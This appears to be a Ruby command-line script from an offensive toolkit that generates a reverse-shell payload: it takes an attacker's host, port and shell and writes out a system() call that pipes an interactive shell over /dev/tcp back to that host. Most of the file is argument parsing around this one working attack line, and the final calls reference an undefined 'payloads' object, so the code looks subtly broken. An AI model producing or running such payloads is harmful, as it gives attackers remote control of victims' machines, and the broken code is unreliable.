#!/usr/bin/env ruby

require 'optparse'
require 'ostruct'

require 'core/payloads'

Signal.trap("INT") {
    abort()
}

options = OpenStruct.new
OptionParser.new do |opt|
    opt.on('-l', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
    opt.on('-p', '--local-port <local_port>', 'Local port.') { |o| options.local_port = o }
    opt.on('-s', '--target-shell <target_shell>', 'Target shell.') { |o| options.target_shell = o }
    opt.on('-o', '--output-path <output_path>', 'Output path.') { |o| options.output_path = o }
    opt.on('-h', '--help', "Show options.") do
        puts "Usage: ruby.rb [-h] --local-host=<local_host> --local-port=<local_port>"
        puts "               --target-shell=<target_shell> --output-path=<output_path>"
        puts ""
        puts "  -h, --help                     Show options."
        puts "  --local-host=<local_host>      Local host."
        puts "  --local-port=<local_port>      Local port."
        puts "  --target-shell=<target_shell>  Target shell."
        puts "  --output-path=<output_path>    Output path."
        abort()
    end
end.parse!

host = options.local_host
port = options.local_port
shell = options.target_shell
file = options.output_path

if not host or not port or not shell or not file
    puts "Usage: ruby.rb [-h] --local-host=<local_host> --local-port=<local_port>"
    puts "               --target-shell=<target_shell> --output-path=<output_path>"
    puts ""
    puts "  -h, --help                     Show options."
    puts "  --local-host=<local_host>      Local host."
    puts "  --local-port=<local_port>      Local port."
    puts "  --target-shell=<target_shell>  Target shell."
    puts "  --output-path=<output_path>    Output path."
    abort()
end

payload = ""
payload += "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\")\n"

payload_handler = payloads.new
payloads.generate_payload(file, payload)
